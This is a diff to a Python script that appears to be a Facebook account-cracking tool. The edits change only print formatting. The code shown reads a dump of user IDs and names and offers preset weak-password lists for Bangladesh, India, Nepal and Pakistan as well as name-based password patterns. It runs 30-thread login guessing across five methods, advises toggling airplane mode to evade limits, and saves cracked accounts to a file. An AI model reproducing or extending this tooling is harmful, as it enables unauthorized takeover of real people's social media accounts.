@@ -130,9 +130,9 @@ def menu():
 def smile_file():
     clr_logo();dmp_in=input(f" {b}ENTER YOUR DUMP FILE {ekual} ")
     try:dmp_ck=open(dmp_in,'r').read().splitlines()
-    except FileNotFoundError:print(f"{sxrline}\n {c}File location not found\n Enter File agin...");time.sleep(4);sxr_file()
+    except FileNotFoundError:print(f"\n {c}File location not found\n Enter File agin...");time.sleep(4);sxr_file()
     clr_logo()
-    print(f" {l1} CUSTOM PASS\n {l2} BD AUTO PASS\n {l3} INDIA AUTO PASS\n {l4} NEPAL AUTO PASS\n {l5} PAK AUTO PASS\n{sxrline}")
+    print(f" {l1} CUSTOM PASS\n {l2} BD AUTO PASS\n {l3} INDIA AUTO PASS\n {l4} NEPAL AUTO PASS\n {l5} PAK AUTO PASS\n");print(led)
     auto_pw = input(f" {b}CHOOSE PASS {ekual}")
     if auto_pw in ['2','02','B','b']:psw.append("203040");psw.append("405060");psw.append("506070");psw.append("708090");psw.append("908070");psw.append("@@##৳৳");psw.append("@#৳%&*");psw.append("113322");psw.append("09876543");psw.append("00998877");psw.append("0987654");psw.append("258000")
     elif auto_pw in ['3','03','C','c']:psw.append("firstlast123");psw.append("57575751");psw.append("last1234");psw.append("57273200");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123")
@@ -143,12 +143,12 @@ def smile_file():
         try:ps_limt=int(input(f" {b}ENTER PASSWORD LIMIT {ekual} "))
         except:ps_limt = 4
         clr_logo()
-        print(f" {b}EXAMPLE {ekual} {b}first123 {f}- {b}firstlast {f}- {b}last123\n{sxrline}")
+        print(f" {b}EXAMPLE {ekual} {b}first123 {f}- {b}firstlast {f}- {b}last123\n");print(led)
         for x in range(ps_limt):
             inp_ps = f"{b} PASSWORD NO {f}{x+1} {ekual} "
             psw.append(input(inp_ps))
     clr_logo()
-    print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4\n {l5} MATHOD {f}- {b}5\n{sxrline}")
+    print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4\n {l5} MATHOD {f}- {b}5\n");print(led)
     sxr_in_mthd = input(f"{b} CHOICE MATHOD {ekual} ")
     if sxr_in_mthd in ['a','A','1','01']:sxr_mthd.append("A")
     elif sxr_in_mthd in ['b','B','2','02']:sxr_mthd.append("B")
@@ -162,7 +162,7 @@ def smile_file():
     with threadpol(max_workers=30) as sifatx:
         clr_logo()
         total_ids = str(len(dmp_ck))
-        print(f" {b}TOTAL CRACK {ekual} {total_ids}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
+        print(f" {b}TOTAL CRACK {ekual} {total_ids}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n");print(led)
         for ids_nam in dmp_ck:
             try:ids,names = ids_nam.split('|')
             except:pass
@@ -172,7 +172,7 @@ def smile_file():
             elif 'C' in sxr_mthd:sifatx.submit(sxr_f_m3,ids,names,pswdx)
             elif 'D' in sxr_mthd:sifatx.submit(sxr_f_m4,ids,names,pswdx)
             elif 'E' in sxr_mthd:sifatx.submit(sxr_f_m5,ids,names,pswdx)
-    print(f"\n{sxrline}\n{b} CREAK PROCESS HAS BEEN COMPLITE\n {b}TOTAL OK ID {ekual} {b}{str(len(oks))}\n{b} FILE SAVE AS {ekual} {a}/sdcard/SMILE-OK&CP.txt\n{sxrline}");exit()
+    print(f"\n\n{b} CREAK PROCESS HAS BEEN COMPLITE\n {b}TOTAL OK ID {ekual} {b}{str(len(oks))}\n{b} FILE SAVE AS {ekual} {a}/sdcard/SMILE-OK&CP.txt\n");print(led);exit()
 #▬▭▬▭▬▭▬▭[ FILE daf ]▬▭▬▭▬▭▬▭#
 def xiv():
     AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
